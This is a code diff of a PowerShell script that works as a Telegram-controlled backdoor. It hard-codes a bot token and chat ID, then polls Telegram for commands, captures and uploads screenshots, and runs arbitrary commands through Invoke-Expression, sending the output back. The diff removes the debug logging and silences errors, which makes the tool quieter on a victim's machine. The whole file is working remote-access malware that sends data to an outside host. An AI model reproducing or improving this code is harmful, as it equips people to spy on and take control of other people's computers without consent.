@@ -1,7 +1,10 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $botToken = "8220355086:AAFI1_k4FoKIF18FShBBn0yezO5dDldzs88"
-$chatId = "6494641721"  # Твой ID
+$chatId = 6494641721  # число, не строка!
 $apiUrl = "https://api.telegram.org/bot$botToken"
+
+# Сброс webhook на всякий случай
+Invoke-RestMethod -Uri "$apiUrl/deleteWebhook" | Out-Null
 
 function Send-TG ($t, $isPath=$false) {
     try {
@@ -10,94 +13,48 @@ function Send-TG ($t, $isPath=$false) {
         }
         else {
             $b = @{chat_id=$chatId; text="[$env:COMPUTERNAME] $t"; parse_mode="Markdown"}
-            Invoke-RestMethod -Uri "$apiUrl/sendMessage" -Method Post -Body $b -ErrorAction Stop
+            Invoke-RestMethod -Uri "$apiUrl/sendMessage" -Method Post -Body $b
         }
-    } catch { 
-        Write-Host "Send error: $_" -ForegroundColor Red
-    }
+    } catch {}
 }
 
-# Тест отправки
-Send-TG "Bot started on $env:COMPUTERNAME"
-
+Send-TG "Online"
 $lastId = 0
 
 while ($true) {
     try {
-        $url = "$apiUrl/getUpdates?offset=$($lastId + 1)&limit=10"
-        Write-Host "Polling: $url" -ForegroundColor DarkGray
-        
-        $res = Invoke-RestMethod -Uri $url -TimeoutSec 25 -ErrorAction Stop
-        
-        Write-Host "Got $($res.result.Count) updates" -ForegroundColor Cyan
-        
-        if ($res.result.Count -eq 0) { 
-            Start-Sleep -Milliseconds 500
-            continue 
-        }
-
+        $res = Invoke-RestMethod -Uri "$apiUrl/getUpdates?offset=$($lastId+1)&limit=100" -TimeoutSec 30
         foreach ($u in $res.result) {
             $lastId = $u.update_id
-            Write-Host "Update ID: $lastId" -ForegroundColor Yellow
+            if ($u.message.chat.id -ne $chatId) { continue }
             
-            # ДЕБАГ: покажи всё что пришло
-            Write-Host "Message object:" -ForegroundColor Magenta
-            $u.message | ConvertTo-Json -Depth 3 | Write-Host
-            
-            $msgText = $u.message.text
-            $fromId = $u.message.from.id
-            $msgChatId = $u.message.chat.id
-            
-            Write-Host "From ID: $fromId | Chat ID: $msgChatId | Text: $msgText" -ForegroundColor Green
-            
-            # ПРОВЕРКА: разрешаем если from.id ИЛИ chat.id совпадают (число vs строка)
-            $allowed = ($fromId -eq [int64]$chatId) -or ($msgChatId -eq [int64]$chatId) -or 
-                       ($fromId -eq $chatId) -or ($msgChatId -eq $chatId)
-            
-            if (-not $allowed) {
-                Write-Host "ACCESS DENIED: from=$fromId, chat=$msgChatId" -ForegroundColor Red
-                continue
-            }
-
-            Write-Host "Processing command: $msgText" -ForegroundColor Green
-
-            switch -Regex ($msgText) {
-                "^/start$" { Send-TG "Ready" }
-                "^/help$"  { Send-TG "Commands: shot, kill, cmd <command>" }
-                "^shot$" {
-                    Send-TG "Taking screenshot..."
+            $msg = $u.message.text
+            switch ($msg) {
+                "/start" { Send-TG "Ready" }
+                "/help"  { Send-TG "shot, kill, cmd" }
+                "shot" {
                     Add-Type -AssemblyName System.Windows.Forms,System.Drawing
                     $s = [Windows.Forms.Screen]::PrimaryScreen.Bounds
                     $b = New-Object Drawing.Bitmap($s.Width, $s.Height)
                     $g = [Drawing.Graphics]::FromImage($b)
                     $g.CopyFromScreen($s.X, $s.Y, 0, 0, $s.Size)
-                    $tmp = "$env:TEMP\ss_$([Guid]::NewGuid().ToString().Substring(0,8)).png"
+                    $tmp = "$env:TEMP\s.png"
                     $b.Save($tmp, [Drawing.Imaging.ImageFormat]::Png)
                     $g.Dispose(); $b.Dispose()
                     Send-TG $tmp $true
-                    if(Test-Path $tmp){ Remove-Item $tmp -Force }
+                    Remove-Item $tmp -ErrorAction SilentlyContinue
                 }
-                "^kill$" { Send-TG "Offline"; exit }
+                "kill" { Send-TG "Offline"; exit }
                 default {
-                    if ($msgText -match "^cmd\s+(.+)") {
+                    if ($msg.StartsWith("cmd ")) {
                         try {
-                            $cmd = $matches[1]
-                            $out = Invoke-Expression $cmd 2>&1 | Out-String
-                            $resOut = if ([string]::IsNullOrWhiteSpace($out)) { "Done (no output)" } else { $out }
-                            Send-TG "``$cmd``:`n$resOut"
-                        } catch { 
-                            Send-TG "Error: $_" 
-                        }
-                    }
-                    else {
-                        Send-TG "Unknown command. Use /help"
+                            $c = $msg.Substring(4)
+                            $o = Invoke-Expression $c 2>&1 | Out-String
+                            Send-TG $(if($o){$o}else{"Done"})
+                        } catch { Send-TG "Error: $_" }
                     }
                 }
             }
         }
-    } 
-    catch { 
-        Write-Host "ERROR: $_" -ForegroundColor Red
-        Start-Sleep -Seconds 2 
-    }
+    } catch { Start-Sleep -Seconds 1 }
 }
